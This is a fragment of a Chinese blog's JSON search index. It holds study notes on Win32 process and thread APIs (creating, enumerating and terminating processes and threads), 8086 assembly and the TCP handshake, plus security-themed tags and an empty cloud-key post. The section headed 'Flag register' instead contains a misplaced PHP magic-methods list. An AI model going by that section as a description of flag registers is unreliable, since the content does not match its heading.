0;&#125;","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.ixxzhi.cn/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"免杀","slug":"免杀","permalink":"https://www.ixxzhi.cn/tags/%E5%85%8D%E6%9D%80/"},{"name":"shellcode","slug":"shellcode","permalink":"https://www.ixxzhi.cn/tags/shellcode/"}]},{"title":"windows系统编程","slug":"windows系统编程","date":"2024-01-03T16:32:27.000Z","updated":"2024-02-23T17:44:53.922Z","comments":true,"path":"2024/01/04/windows系统编程/","link":"","permalink":"https://www.ixxzhi.cn/2024/01/04/windows%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/","excerpt":"进程相关基础 创建进程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int CreateProcessDemo()&#123; /* DWORD cb; 当前结构的大小，需要事先填充，防止后续新增字段导致结构体大小变更 LPWSTR lpReserved; 保留字段未使用 LPWSTR lpDesktop; 指定桌面名称 LPWSTR lpTitle; 控制台程序的窗口标题 DWORD dwX; 新窗口的位置信息和尺寸信息 DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; 新窗口控制台可以显示的行数和列数 DWORD dwYCountChars; DWORD dwFillAttribute;指定控制台程序的背景颜色 DWORD dwFlags; 标志，指定当前结构的哪些成员是有效的 WORD wShowWindow; 窗口的显示方式是什么 WORD cbReserved2; 保留字段 LPBYTE lpReserved2; 保留字段 HANDLE hStdInput; 标准输入句柄 HANDLE hStdOutput; 标准输出句柄 HANDLE hStdError; 标准错误句柄 */ STARTUPINFO StartupInfo&#123;&#125;; StartupInfo.cb = sizeof(StartupInfo); PROCESS_INFORMATION ProcessInformation; BOOL rtn = CreateProcess( //_In_opt_ LPCWSTR lpApplicationName, L&quot;G:\\\\Tools\\\\Layer5.0SAINTSEC\\\\Layer.exe&quot;,//想要执行的程序路径 //_Inout_opt_ LPWSTR lpCommandLine, NULL,//要传递给可执行模块的参数 //_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, NULL,//进程安全属性，如果是NULLL则使用默认的安全属性 //_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, NULL,//线程安全属性，如果是NULLL则使用默认的安全属性 //_In_ BOOL bInheritHandles, FALSE,//指定了当前进程中的可继承句柄是否可以被启动的新进程所继承 //_In_ DWORD dwCreationFlags, 0,//指定新进程的优先级和创建标志 //_In_opt_ LPVOID lpEnvironment, NULL,//指定新进程使用的环境变量 //_In_opt_ LPCWSTR lpCurrentDirectory, NULL,//指定新进程使用的当前目录 //_In_ LPSTARTUPINFOW lpStartupInfo, &amp;StartupInfo,//启动信息 //_Out_ LPPROCESS_INFORMATION lpProcessInformation &amp;ProcessInformation //进程相关信息 ); if (!rtn) &#123; printf(&quot;Create Process Field!&quot;); &#125; else &#123; printf(&quot;dwProcessId:\\t%d\\n&quot;, ProcessInformation.dwProcessId); printf(&quot;dwThreadId:\\t%d\\n&quot;, ProcessInformation.dwThreadId); printf(&quot;hProcess:\\t%d\\n&quot;, ProcessInformation.hProcess); printf(&quot;hThread:\\t%d\\n&quot;, ProcessInformation.hThread); &#125; system(&quot;pause&quot;); return 0;&#125;","text":"进程相关基础 创建进程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859int CreateProcessDemo()&#123; /* DWORD cb; 当前结构的大小，需要事先填充，防止后续新增字段导致结构体大小变更 LPWSTR lpReserved; 保留字段未使用 LPWSTR lpDesktop; 指定桌面名称 LPWSTR lpTitle; 控制台程序的窗口标题 DWORD dwX; 新窗口的位置信息和尺寸信息 DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; 新窗口控制台可以显示的行数和列数 DWORD dwYCountChars; DWORD dwFillAttribute;指定控制台程序的背景颜色 DWORD dwFlags; 标志，指定当前结构的哪些成员是有效的 WORD wShowWindow; 窗口的显示方式是什么 WORD cbReserved2; 保留字段 LPBYTE lpReserved2; 保留字段 HANDLE hStdInput; 标准输入句柄 HANDLE hStdOutput; 标准输出句柄 HANDLE hStdError; 标准错误句柄 */ STARTUPINFO StartupInfo&#123;&#125;; StartupInfo.cb = sizeof(StartupInfo); PROCESS_INFORMATION ProcessInformation; BOOL rtn = CreateProcess( //_In_opt_ LPCWSTR lpApplicationName, L&quot;G:\\\\Tools\\\\Layer5.0SAINTSEC\\\\Layer.exe&quot;,//想要执行的程序路径 //_Inout_opt_ LPWSTR lpCommandLine, NULL,//要传递给可执行模块的参数 //_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, NULL,//进程安全属性，如果是NULLL则使用默认的安全属性 //_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, NULL,//线程安全属性，如果是NULLL则使用默认的安全属性 //_In_ BOOL bInheritHandles, FALSE,//指定了当前进程中的可继承句柄是否可以被启动的新进程所继承 //_In_ DWORD dwCreationFlags, 0,//指定新进程的优先级和创建标志 //_In_opt_ LPVOID lpEnvironment, NULL,//指定新进程使用的环境变量 //_In_opt_ LPCWSTR lpCurrentDirectory, NULL,//指定新进程使用的当前目录 //_In_ LPSTARTUPINFOW lpStartupInfo, &amp;StartupInfo,//启动信息 //_Out_ LPPROCESS_INFORMATION lpProcessInformation &amp;ProcessInformation //进程相关信息 ); if (!rtn) &#123; printf(&quot;Create Process Field!&quot;); &#125; else &#123; printf(&quot;dwProcessId:\\t%d\\n&quot;, ProcessInformation.dwProcessId); printf(&quot;dwThreadId:\\t%d\\n&quot;, ProcessInformation.dwThreadId); printf(&quot;hProcess:\\t%d\\n&quot;, ProcessInformation.hProcess); printf(&quot;hThread:\\t%d\\n&quot;, ProcessInformation.hThread); &#125; system(&quot;pause&quot;); return 0;&#125; 退出进程 123456789101112131415161718//退出当前进程，参数为退出码ExitProcess(0);//打开一个进程并退出void TerminateProcessDemo() &#123; HANDLE hProcess = OpenProcess( //_In_ DWORD dwDesiredAccess, PROCESS_ALL_ACCESS,//权限 //_In_ BOOL bInheritHandle, FALSE,//返回的句柄是否可以继承 //_In_ DWORD dwProcessId 9940//打开进程的唯一标识符,进程ID ); if (hProcess==INVALID_HANDLE_VALUE)&#123; printf(&quot;Open Process Field!\\n&quot;); &#125;else&#123; TerminateProcess(hProcess,9940); &#125;&#125; 遍历进程 123456789101112131415161718192021222324252627282930void traversalProcessDemo() &#123;/* #define TH32CS_SNAPHEAPLIST 0x00000001 堆 需要指定第二个参数中的进程ID #define TH32CS_SNAPPROCESS 0x00000002 进程 不需要指定第二个参数中的进程ID #define TH32CS_SNAPTHREAD 0x00000004 线程 需要指定第二个参数中的进程ID #define TH32CS_SNAPMODULE 0x00000008 模块 需要指定第二个参数中的进程ID*/ HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);/* DWORD dwSize; 本结构的尺寸 DWORD cntUsage; 当前的引用计数 DWORD th32ProcessID; 进程的ID ULONG_PTR th32DefaultHeapID; 当前进程的默认堆的ID DWORD th32ModuleID; 模块ID DWORD cntThreads; 当前进程的线程总数 DWORD th32ParentProcessID; 父进程ID LONG pcPriClassBase; 当前进程创建的线程的基本优先级 DWORD dwFlags; 标志位 WCHAR szExeFile[MAX_PATH]; 进程对应的文件名*/ PROCESSENTRY32 pe32; pe32.dwSize = sizeof(pe32); bool rtn = Process32First(hSnapshot, &amp;pe32); while (rtn)&#123; wprintf(L&quot;ProcessName:%s\\n&quot;, pe32.szExeFile); printf(&quot;ProcessID:%d\\n&quot;, pe32.th32ProcessID); printf(&quot;------------------------\\n&quot;); rtn = Process32Next(hSnapshot, &amp;pe32); &#125;&#125; 线程相关基础 创建线程，等待线程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253DWORD ThreadCallBackA(LPVOID lpThreadParameter) &#123; for (int i = 0; i &lt; 100000; i++) &#123; printf(&quot;Thread A Output %d\\n&quot;, i); &#125; return 0;&#125;DWORD ThreadCallBackB(LPVOID lpThreadParameter) &#123; for (int i = 0; i &lt; 100000; i++) &#123; printf(&quot;Thread B Output %d\\n&quot;, i); &#125; return 0;&#125;int main() &#123; //-------------以下为线程A------------------ DWORD lpThreadIdA=0; HANDLE hThreadA = CreateThread( //_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, NULL,//安全属性 //_In_ SIZE_T dwStackSize, NULL,//堆栈的初始大小 //_In_ LPTHREAD_START_ROUTINE lpStartAddress, (LPTHREAD_START_ROUTINE)ThreadCallBackA,//线程启动地址，函数地址，也可以理解为开启一个新的线程去调用该函数 //_In_opt_ __drv_aliasesMem LPVOID lpParameter, NULL,//线程函数的参数 //_In_ DWORD dwCreationFlags, NULL,//启动标记，0x0为直接运行，0x4(CREATE_SUSPENDED)为挂起运行 //_Out_opt_ LPDWORD lpThreadId &amp;lpThreadIdA ); //等待线程 WaitForSingleObject(hThreadA, INFINITE); //-------------以下为线程B------------------ DWORD lpThreadIdB = 0; HANDLE hThreadB = CreateThread( //_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, NULL,//安全属性 //_In_ SIZE_T dwStackSize, NULL,//堆栈的初始大小 //_In_ LPTHREAD_START_ROUTINE lpStartAddress, (LPTHREAD_START_ROUTINE)ThreadCallBackB,//线程启动地址，函数地址，也可以理解为开启一个新的线程去调用该函数 //_In_opt_ __drv_aliasesMem LPVOID lpParameter, NULL,//线程函数的参数 //_In_ DWORD dwCreationFlags, NULL,//启动标记，0x0为直接运行，0x4(CREATE_SUSPENDED)为挂起运行 //_Out_opt_ LPDWORD lpThreadId &amp;lpThreadIdB ); WaitForSingleObject(hThreadB, INFINITE); for (int i = 0; i &lt; 100000; i++) &#123; printf(&quot;main Output %d\\n&quot;, i); &#125; return 0;&#125; 遍历线程 12345678910111213141516void TraversalThreadDemo() &#123; DWORD dwProcessID = 10204; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID); THREADENTRY32 te32; te32.dwSize = sizeof(te32); BOOL rtn = Thread32First(hSnapshot, &amp;te32); while (rtn) &#123; if (te32.th32OwnerProcessID == dwProcessID) &#123; printf(&quot;ThreadID: % d\\n&quot;, te32.th32ThreadID); printf(&quot;OwnerProcessID: % d\\n&quot;, te32.th32OwnerProcessID); printf(&quot;BasePri: % d\\n&quot;, te32.tpBasePri); printf(&quot;---------------------------------------\\n&quot;); &#125; rtn = Thread32Next(hSnapshot, &amp;te32); &#125;&#125; 结束线程，挂起线程，恢复线程 1234567891011121314151617181920212223void TraversalThreadDemo() &#123; DWORD dwProcessID = 24848; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID); THREADENTRY32 te32; te32.dwSize = sizeof(te32); BOOL rtn = Thread32First(hSnapshot, &amp;te32); while (rtn) &#123; if (te32.th32OwnerProcessID == dwProcessID) &#123; printf(&quot;ThreadID: % d\\n&quot;, te32.th32ThreadID); printf(&quot;OwnerProcessID: % d\\n&quot;, te32.th32OwnerProcessID); printf(&quot;BasePri: % d\\n&quot;, te32.tpBasePri); printf(&quot;---------------------------------------\\n&quot;); HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID); //结束线程 TerminateThread(hThread, -1); //挂起线程 //SuspendThread(hThread); //恢复线程 //ResumeThread(hThread); &#125; rtn = Thread32Next(hSnapshot, &amp;te32); &#125;&#125; 完整代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191// ConsoleApplication1.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。//#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;tlhelp32.h&gt;int CreateProcessDemo()&#123; /* DWORD cb; 当前结构的大小，需要事先填充，防止后续新增字段导致结构体大小变更 LPWSTR lpReserved; 保留字段未使用 LPWSTR lpDesktop; 指定桌面名称 LPWSTR lpTitle; 控制台程序的窗口标题 DWORD dwX; 新窗口的位置信息和尺寸信息 DWORD dwY; DWORD dwXSize; DWORD dwYSize; DWORD dwXCountChars; 新窗口控制台可以显示的行数和列数 DWORD dwYCountChars; DWORD dwFillAttribute;指定控制台程序的背景颜色 DWORD dwFlags; 标志，指定当前结构的哪些成员是有效的 WORD wShowWindow; 窗口的显示方式是什么 WORD cbReserved2; 保留字段 LPBYTE lpReserved2; 保留字段 HANDLE hStdInput; 标准输入句柄 HANDLE hStdOutput; 标准输出句柄 HANDLE hStdError; 标准错误句柄 */ STARTUPINFO StartupInfo&#123;&#125;; StartupInfo.cb = sizeof(StartupInfo); PROCESS_INFORMATION ProcessInformation; BOOL rtn = CreateProcess( //_In_opt_ LPCWSTR lpApplicationName, L&quot;G:\\\\Tools\\\\Layer5.0SAINTSEC\\\\Layer.exe&quot;,//想要执行的程序路径 //_Inout_opt_ LPWSTR lpCommandLine, NULL,//要传递给可执行模块的参数 //_In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, NULL,//进程安全属性，如果是NULLL则使用默认的安全属性 //_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, NULL,//线程安全属性，如果是NULLL则使用默认的安全属性 //_In_ BOOL bInheritHandles, FALSE,//指定了当前进程中的可继承句柄是否可以被启动的新进程所继承 //_In_ DWORD dwCreationFlags, 0,//指定新进程的优先级和创建标志 //_In_opt_ LPVOID lpEnvironment, NULL,//指定新进程使用的环境变量 //_In_opt_ LPCWSTR lpCurrentDirectory, NULL,//指定新进程使用的当前目录 //_In_ LPSTARTUPINFOW lpStartupInfo, &amp;StartupInfo,//启动信息 //_Out_ LPPROCESS_INFORMATION lpProcessInformation &amp;ProcessInformation //进程相关信息 ); if (!rtn) &#123; printf(&quot;Create Process Field!&quot;); &#125; else &#123; printf(&quot;dwProcessId:\\t%d\\n&quot;, ProcessInformation.dwProcessId); printf(&quot;dwThreadId:\\t%d\\n&quot;, ProcessInformation.dwThreadId); printf(&quot;hProcess:\\t%d\\n&quot;, ProcessInformation.hProcess); printf(&quot;hThread:\\t%d\\n&quot;, ProcessInformation.hThread); &#125; system(&quot;pause&quot;); return 0;&#125;void TerminateProcessDemo() &#123; HANDLE hProcess = OpenProcess( //_In_ DWORD dwDesiredAccess, PROCESS_ALL_ACCESS,//权限 //_In_ BOOL bInheritHandle, FALSE,//返回的句柄是否可以继承 //_In_ DWORD dwProcessId 9940//打开进程的唯一标识符,进程ID ); if (hProcess==INVALID_HANDLE_VALUE)&#123; printf(&quot;Open Process Field!\\n&quot;); &#125;else&#123; TerminateProcess(hProcess,9940); &#125;&#125;void TraversalProcessDemo() &#123;/* #define TH32CS_SNAPHEAPLIST 0x00000001 堆 需要指定第二个参数中的进程ID #define TH32CS_SNAPPROCESS 0x00000002 进程 不需要指定第二个参数中的进程ID #define TH32CS_SNAPTHREAD 0x00000004 线程 需要指定第二个参数中的进程ID #define TH32CS_SNAPMODULE 0x00000008 模块 需要指定第二个参数中的进程ID*/ HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);/* DWORD dwSize; 本结构的尺寸 DWORD cntUsage; 当前的引用计数 DWORD th32ProcessID; 进程的ID ULONG_PTR th32DefaultHeapID; 当前进程的默认堆的ID DWORD th32ModuleID; 模块ID DWORD cntThreads; 当前进程的线程总数 DWORD th32ParentProcessID; 父进程ID LONG pcPriClassBase; 当前进程创建的线程的基本优先级 DWORD dwFlags; 标志位 WCHAR szExeFile[MAX_PATH]; 进程对应的文件名*/ PROCESSENTRY32 pe32; pe32.dwSize = sizeof(pe32); bool rtn = Process32First(hSnapshot, &amp;pe32); while (rtn)&#123; wprintf(L&quot;ProcessName:%s\\n&quot;, pe32.szExeFile); printf(&quot;ProcessID:%d\\n&quot;, pe32.th32ProcessID); printf(&quot;------------------------\\n&quot;); rtn = Process32Next(hSnapshot, &amp;pe32); &#125;&#125;DWORD ThreadCallBackA(LPVOID lpThreadParameter) &#123; for (int i = 0; i &lt; 100000; i++) &#123; printf(&quot;Thread A Output %d\\n&quot;, i); &#125; return 0;&#125;DWORD ThreadCallBackB(LPVOID lpThreadParameter) &#123; for (int i = 0; i &lt; 100000; i++) &#123; printf(&quot;Thread B Output %d\\n&quot;, i); &#125; return 0;&#125;int CreateThreadDemo() &#123; //-------------以下为线程A------------------ DWORD lpThreadIdA=0; HANDLE hThreadA = CreateThread( //_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, NULL,//安全属性 //_In_ SIZE_T dwStackSize, NULL,//堆栈的初始大小 //_In_ LPTHREAD_START_ROUTINE lpStartAddress, (LPTHREAD_START_ROUTINE)ThreadCallBackA,//线程启动地址，函数地址，也可以理解为开启一个新的线程去调用该函数 //_In_opt_ __drv_aliasesMem LPVOID lpParameter, NULL,//线程函数的参数 //_In_ DWORD dwCreationFlags, NULL,//启动标记，0x0为直接运行，0x4(CREATE_SUSPENDED)为挂起运行 //_Out_opt_ LPDWORD lpThreadId &amp;lpThreadIdA ); //等待线程 WaitForSingleObject(hThreadA, INFINITE); //-------------以下为线程B------------------ DWORD lpThreadIdB = 0; HANDLE hThreadB = CreateThread( //_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, NULL,//安全属性 //_In_ SIZE_T dwStackSize, NULL,//堆栈的初始大小 //_In_ LPTHREAD_START_ROUTINE lpStartAddress, (LPTHREAD_START_ROUTINE)ThreadCallBackB,//线程启动地址，函数地址，也可以理解为开启一个新的线程去调用该函数 //_In_opt_ __drv_aliasesMem LPVOID lpParameter, NULL,//线程函数的参数 //_In_ DWORD dwCreationFlags, NULL,//启动标记，0x0为直接运行，0x4(CREATE_SUSPENDED)为挂起运行 //_Out_opt_ LPDWORD lpThreadId &amp;lpThreadIdB ); WaitForSingleObject(hThreadB, INFINITE); for (int i = 0; i &lt; 100000; i++) &#123; printf(&quot;main Output %d\\n&quot;, i); &#125; return 0;&#125;void TraversalThreadDemo() &#123; DWORD dwProcessID = 24848; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessID); THREADENTRY32 te32; te32.dwSize = sizeof(te32); BOOL rtn = Thread32First(hSnapshot, &amp;te32); while (rtn) &#123; if (te32.th32OwnerProcessID == dwProcessID) &#123; printf(&quot;ThreadID: % d\\n&quot;, te32.th32ThreadID); printf(&quot;OwnerProcessID: % d\\n&quot;, te32.th32OwnerProcessID); printf(&quot;BasePri: % d\\n&quot;, te32.tpBasePri); printf(&quot;---------------------------------------\\n&quot;); HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID); //结束线程 TerminateThread(hThread, -1); //挂起线程 //SuspendThread(hThread); //ResumeThread(hThread); &#125; rtn = Thread32Next(hSnapshot, &amp;te32); &#125;&#125;int main() &#123; TraversalThreadDemo();&#125;","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.ixxzhi.cn/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"C/C++","slug":"C-C","permalink":"https://www.ixxzhi.cn/tags/C-C/"}]},{"title":"8086汇编","slug":"汇编","date":"2023-12-19T16:05:08.000Z","updated":"2024-02-27T18:34:46.822Z","comments":true,"path":"2023/12/20/汇编/","link":"","permalink":"https://www.ixxzhi.cn/2023/12/20/%E6%B1%87%E7%BC%96/","excerpt":"汇编 调试 1234567debug test.exe-r 查看当前的状态，包括寄存器、 地址和汇编指令-p 单步步过-t 单步步入-u 查看汇编代码，在输入u接着显示-d 0d9a 显示内存-g 退出","text":"汇编 调试 1234567debug test.exe-r 查看当前的状态，包括寄存器、 地址和汇编指令-p 单步步过-t 单步步入-u 查看汇编代码，在输入u接着显示-d 0d9a 显示内存-g 退出 指令 12345678910111213141516171819202122232425262728callret;加减法：add p1,p2 ;两数相加把结果放p1inc ax ;自增相当于ax++sub p1,p2;两数相减把结果放p1dec ax ;自减相当于ax--loop ;每循环一次CX（计数寄存器）的值减一cmp p1,p2;两数相减比较CF:进位位，有进位或借位为1ZF:零值位，计算结果为0则为1cmp ax,bx;ax- bx ==0 -&gt; CF:0 ZF:1ax!=bx-&gt; ax-bx!=0 -&gt; ZF:0ax&lt;bx -&gt; ax-bx&lt;0 -&gt; CF:1 ZF:0ab&gt;bx -&gt; ax-bx&gt;0 -&gt; CF:0 ZF:0ax&lt;=bx -&gt; ax-bx&lt;=0 -&gt; CF:1 || ZF:1ax&gt;=bx -&gt; ax -bx&gt;=0 -&gt; CF:0 || ZF:1 jmp addr;无条件跳转，不依赖条件je/jz (标号/地址);条件转移，等于则跳转，ZF=1jne addr;不等于则跳转,ZF=0则跳转jb addr; 低于则跳转 CF=1ja addr; 高于则跳转 CF=0 &amp;&amp; ZF=0jnb addr;不低于则跳转jna addr;不高于则跳转 “函数” 1234567891011121314151617181920assume cs:codecode segment;定义一个函数btadd PROC ;取ax,bx相加并把结果保存在ax add ax,bx ;返回 retbtadd ENDP;程序入口start:mov ax,3mov bx,4call btadd;退出mov ax,4C00H;DOS中断int 21code endsend start Flag寄存器 xxxxxxxxxx __construct() 当一个对象创建时被调用，__destruct() 当一个对象销毁时被调用，__toString() 当一个对象被当作一个字符串被调用。__wakeup() 使用unserialize时触发__sleep() 使用serialize时触发__destruct() 对象被销毁时触发__call() 在对象上下文中调用不可访问的方法时触发__callStatic() 在静态上下文中调用不可访问的方法时触发__get() 用于从不可访问的属性读取数据__set() 用于将数据写入不可访问的属性__isset() 在不可访问的属性上调用isset()或empty()触发__unset() 在不可访问的属性上使用unset()时触发__toString() 把类当作字符串使用时触发,返回值需要为字符串__invoke() 当脚本尝试将对象调用为函数时触发php","categories":[{"name":"学习笔记","slug":"学习笔记","permalink":"https://www.ixxzhi.cn/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"汇编语言","slug":"汇编语言","permalink":"https://www.ixxzhi.cn/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"}]},{"title":"阿里云AK/SK利用","slug":"阿里云AK-SK利用","date":"2023-11-19T07:32:26.000Z","updated":"2023-11-19T12:55:11.791Z","comments":true,"path":"2023/11/19/阿里云AK-SK利用/","link":"","permalink":"https://www.ixxzhi.cn/2023/11/19/%E9%98%BF%E9%87%8C%E4%BA%91AK-SK%E5%88%A9%E7%94%A8/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"TCP协议详解","slug":"TCP协议详解","date":"2023-09-13T06:34:17.000Z","updated":"2023-10-30T15:27:25.674Z","comments":true,"path":"2023/09/13/TCP协议详解/","link":"","permalink":"https://www.ixxzhi.cn/2023/09/13/TCP%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3/","excerpt":"TCP简介 TCP，即Transmission Control Protocol，传输控制协议。人如其名，要对数据的传输进行一个详细的控制。","text":"TCP简介 TCP，即Transmission Control Protocol，传输控制协议。人如其名，要对数据的传输进行一个详细的控制。 源端口号：表示数据从哪个进程来 目的端口号：表示数据要到哪个进程去 序列号：在建立连接时由计算机生成的随机数作为其初始值，通过SYN包传给接收端主机，每发送一次数据，就累加一次该数据字节数的大小，用来解决网络包乱序的问题。 确认应答号：指下一次期望收到的数据的序列号，发送端收到这个确认应答以后可以认为在这个序号以前的数据都已被正常接收，用来解决不丢包的问题。 6位保留位 6位标志位 URG：紧急指针是否有效 ACK：确认号是否有效，该位为1时，确认应答的字段变为有效，TCP规定除了最初建立时的SYN包之外该位必须设置为1。 PSH：提示接收端应用程序立刻从TCP缓冲区把数据读走 RST：对方要求重新建立连接，我们把携带RST标识的报文称为复位报文，该位为1时，表示TCP连接中出现异常必须强制断开连接。 SYN：请求建立连接，我们把携带SYN表示的报文称为同步报文段，该位为1时，表示希望建立连接，并在其序列号的字段进行序列号初始值的设定。 FIN：通知对方，本端要关闭了，我们称携带FIN标识的报文为结束报文段，该位为1时，表示以后不会再有数据发送，希望断开连接。当通信结束希望断开连接时，通信双方的主机之间就可以相互交换FIN位为1的TCP报文。 字段名称 第一次 第二次 第三次 SeqNo 4070717244 1509144546 4070717245 AckNo 0 4070717245 1509144547 SYN 1 1 0 Ack 0 1 1 确认应答机制 TCP是可靠的传输协议，确认应答机制是TCP保证可靠性的最核心机制！ 在确认应答机制中，发送方在发送数据包后会等待接收方发送确认消息。如果发送方在一定的时间内没有收到确认消息，它会认为数据包丢失或发生错误，并会重新发送数据包。接收方通过发送确认消息来告知发送方数据包已成功接受，或者指示需要重发某个数据包。 普通报文：ACK这一位为0 应答报文：ACK这一位为1 特殊情况：如果客户端一次性给服务器发送多条消息，那么浏览器的应答就会产生歧义 在网络上有一种特殊情况，“后发先至”，后发的请求可能先到 因此就会产生上述两种情况。 为了解决上述问题，就可以针对请求和应答报文进行编号！ 针对编号就可以很明确的分出是哪个请求的应答。即使出现“后发先至”的情况也没有问题。 而这个编号就对应TCP报文结构中的32位序号和32位确认序号。 32位序号：针对请求数据进行编号 32位确认序号：针对应答（ACK）报文进行编号 注：TCP报文头只能存一个序号，存的是最后一个字节的序号，是根据报文长度来算的 上述数据的传输过程也不是一帆风顺的，可能出现丢包，如果丢包，这就需要TCP的超时重传机制了。 超时重传 超时重传是当发送方发送数据包后，如果在一定的时间内未收到接收方的确认消息（ACK），发送方会认为数据包可能丢失或发生错误，并会重新发送该数据包。 超时重传的工作原理如下： 发送方发送数据包后，等待接收方的确认消息。 如果在设定的时间内，发送方未收到接收方的确认消息，就会认为数据包丢失或发生错误。 发送方会重新发送相同的数据包 接收方收到重复的数据包时，会丢弃重复数据包，并发送之前已接收到的最后一个正确的确认消息 发送方在收到接收方的确认消息后，继续发送下一个数据包。 超时时间如何确定？ 一般操作系统中有一个配置项，描述超时时间的阈值。 如果第一次出现丢包，超出时间阈值后，进行重传，第二次的超时时间阈值就会比第一次更长。 如果重传几次依旧无法传输，就会重置TCP连接，如果还是连接不上，就会直接释放连接 超时重传会出现两种情况： 数据包丢了 ACK丢了 对于这两种情况发送方都区分不了这两种情况，对于第二种情况，接收方就会收到重复的数据，但是可以根据序号进行去重 三次握手 三次握手是在TCP协议中建立一个可靠的连接所使用的一种机制，它由发送方和接收方之间进行的三次通信组成，用于确保双方都愿意建立连接，并同步各自的初始序列号。 三次握手类似于打电话： 三次握手的过程本质上是四次数据的交互，只是中间两条数据可以合并到一起 三次握手的步骤： 第一次握手（SYN）：发送方向接收方发送一个带有SYN标志的数据包（SYN包），请求建立连接。发送方会随机选择一个初始序列号，并将它放在SYN包中的序列号字段中发送给接收方。 第二次握手（SYN+ACK）：接收方收到SYN包后，会向发送方发送一个带有SYN和ACK标志的数据包（SYN+ACK包），表示接受建立连接的请求，并回复确认号（ACK）和自己的初始序列号。接收方还会随机选择一个初始序列号，并将它放在SYN+ACK包中的序列号字段中发送给发送方。 第三次握手（ACK）：发送方收到SYN+ACK包后，回向接收方发送一个带有ACK标志的数据包（ACK包），确认接收方的确认号，并发送自己的确认号。接收方收到ACK包后，会确认发送方的确认号，并完成连接的建立。 为什么要建立连接以及建立连接的意义： 检查一下当前的网络情况是否畅通 三次握手也是在检查通信双方的发送能力和接收能力是正常的 三次握手过程中，也在协商一些重要的参数 两个重要的TCP状态： LISTEN：表示服务器正在监听来自客户端的连接请求。服务器在LISTEN状态下，等待客户端发起连接请求。 ESTABLISHED：表示TCP连接已经建立，双方可以进行数据的传输。在ESTABLISHED状态下，双方可以互相发送数据包。 为什么两次握手不行？ 阻止重复历史连接的初始化（主要原因） 当旧的SYN报文先到达服务端，服务端回一个ACK+SYN报文 客户端收到后可以根据自身的上下文，判断这是一个历史连接（序列号过期或超时），那么客户端就会发送RST报文给服务端，表示中止这次连接。 两次握手在收到服务端的响应后开始发生数据，不能判断当前连接是否是历史连接。 同步双方的初始序列号 TCP协议的通信双方，必须维护同一个序列号，序列号是可靠传输的一个关键因素 接收端可以去除重复数据 接收端可以按照序列号顺序接受 标识发送的数据包哪些已经被收到 两次握手只保证了一方的初始序列号能被对方成功接受，没办法保证双方的初始序列号都能被确认接受 避免资源浪费 两次握手会造成消息滞留情况下，服务器重复接受无用的连接请求SYN报文，而造成重复分配资源 只有两次握手时，如果客户端的SYN请求在网络中阻塞，客户端没有收到服务端的ACK报文，会重新发送SYN 由于没有第三次握手，服务器不清楚客户端是否收到了自己发送的建立连接的ACK确认信号，所以每收到一个SYN就只能先主动建立一个连接。 四次挥手 四次挥手是在TCP协议中用于终止一个已建立的连接的机制。他是TCP连接的正常关闭流程，由发送方和接收方之间进行的四次通信组成。 以下是四次挥手的步骤： 第一次挥手（FIN）：发送方向接收方发送一个带有FIN标志的数据包（FIN包），表示发送方已经完成数据的发送，希望关闭连接。发送方不再发送数据，但仍然可以接受数据。 第二次挥手（ACK）：接收方收到FIN包后，向发送方发送一个带有确认号（ACK）的数据包，表示已接收到发送方的关闭请求。接收方仍然可以发送数据。 第三次挥手（FIN）：接收方向发送方发送一个带有FIN标志的数据包（FIN包），表示接收方也希望关闭连接。接收方停止发送数据，但仍然可以接受数据。 第四次挥手（ACK）：发送方收到FIN包后，向接收方发送一个带有确认号（ACK）的数据包，表示已接收到接收方的关闭请求。发送方不再发送数据，也不再接收数据。 两个重要的TCP状态： CLOSE_WAIT：表示TCP连接的一方已经收到了对方的连接终止请求（FIN包），并发送了确认（ACK）包。在CLOSE_WAIT状态下，接收方等待应用层处理完数据后的连接关闭。 